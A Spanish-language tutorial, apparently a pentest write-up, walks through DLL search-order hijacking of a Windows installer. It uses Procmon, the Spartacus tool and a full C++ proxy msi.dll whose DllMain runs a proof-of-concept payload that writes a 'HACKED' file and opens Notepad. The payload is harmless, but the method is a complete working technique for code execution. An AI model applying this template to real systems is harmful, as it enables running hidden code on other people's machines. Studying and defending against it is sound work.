# **DLL Hijacking**

## *Descubrimiento de la vulnerabilidad**

El primer paso es identificar que el instalador tiene un problema de **DLL Search Order Hijacking**. Para ello ejecutamos **Procmon** mientras lanzamos el instalador vulnerable y aplicamos este filtro:

```
Operation = CreateFile 
Path ends with = .dll 
Result = NAME NOT FOUND
```

Durante la ejecución veremos que el instalador intenta cargar `msi.dll` y `bcrypt.dll` **primero desde su propio directorio** (`C:\Installer\msi.dll`), no las encuentra (NAME NOT FOUND), y entonces sí las carga desde `C:\Windows\System32`. 

**Esto es crítico**: Windows busca DLLs en el directorio de la aplicación **ANTES** que en System32. Si podemos escribir en esa carpeta, podemos hijackear esas DLLs.

## **Automatización con Spartacus**

Aquí entra **[Spartacus](https://github.com/Accenture/Spartacus)**, una herramienta que automatiza todo el proceso. Simplemente ejecutamos:

```powershell
.\Spartacus.exe --mode dll --procmon "C:\Tools\Procmon64.exe" --pml "C:\Data\logs.pml" --csv "C:\Data\VulnerableDLLFiles.csv" --solution "C:\Data\Solutions" --verbose
```

Spartacus hace su magia:

1. Parsea los logs de Procmon automáticamente
2. Identifica las 2 DLLs vulnerables (`msi.dll`, `bcrypt.dll`)
3. Extrae las **295 funciones exportadas** de `msi.dll` usando Ghidra
4. Genera un **proyecto Visual Studio completo** listo para compilar

El resultado son dos carpetas interesantes:

- `C:\Data\VulnerableDLLFiles.csv` → Lista de DLLs hijackeables
- `C:\Data\Solutions\msi\` → Proyecto VS con **295 exports proxy**

## **Modificando el código para RCE**

Abrimos `C:\Data\Solutions\msi\msi.sln` en Visual Studio. Spartacus ya ha generado **295 líneas** de `#pragma comment(linker,"/export:...")` que **NO debemos tocar**. Estas redirigen todas las llamadas del instalador a la `msi.dll` original.

**Solo sustituimos** la función `DllMain` por nuestro payload:

```cpp
#include <windows.h>

HMODULE hOriginalMsi = NULL;

DWORD WINAPI PayloadThread(LPVOID) {
    // Crear C:\temp si no existe
    CreateDirectoryW(L"C:\\temp", NULL);
    
    // Escribir mensaje HACK
    const wchar_t* msg = L"HAS SIDO HACKEADO\n\n"
                        L"DLL Hijacking msi.dll PoC\n"
                        L"Tu sistema comprometido!";
    
    HANDLE hFile = CreateFileW(L"C:\\temp\\HACKED.txt", 
                              GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                              FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, msg, wcslen(msg)*2, &written, NULL);
        CloseHandle(hFile);
    }
    
    // Abrir con notepad
    wchar_t cmd[] = L"notepad.exe C:\\temp\\HACKED.txt";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    
    MessageBoxW(NULL, L"HACKED!\nmsi.dll hijacked", L"PoC", MB_OK);
    
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID) {
    switch (dwReason) {
    case DLL_PROCESS_ATTACH: {
        DisableThreadLibraryCalls(hModule);
        hOriginalMsi = LoadLibraryW(L"C:\\Windows\\System32\\msi.dll");
        
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
        break;
    }
    case DLL_PROCESS_DETACH: {
        if (hOriginalMsi) FreeLibrary(hOriginalMsi);
        break;
    }
    }
    return TRUE;
}
```

## **Compilar y explotar**

Compilamos para x64 en Release y copiamos la DLL maliciosa al directorio del instalador:

```powershell
copy x64\Release\msi.dll "C:\Path\To\Installer\msi.dll"
```

## **Qué verás al explotar**

1. **Se abre Notepad** mostrando `C:\temp\HACKED.txt` con el mensaje
2. **Aparece MessageBox** "MSI.DLL HIJACKED"  
3. **El instalador sigue funcionando normalmente** (gracias al proxy)
4. **Tienes RCE** con los privilegios del usuario que ejecutó el instalador

## **Por qué funciona**

Cuando el instalador hace `LoadLibrary("msi.dll")`:

1. Windows busca **primero** en `C:\Installer\` 
2. Encuentra **nuestra** `msi.dll` maliciosa
3. Se ejecuta `DllMain(DLL_PROCESS_ATTACH)`
4. Creamos hilo paralelo con `PayloadThread()`
5. Todas las llamadas del instalador a funciones de msi.dll se **forwardean** a la original
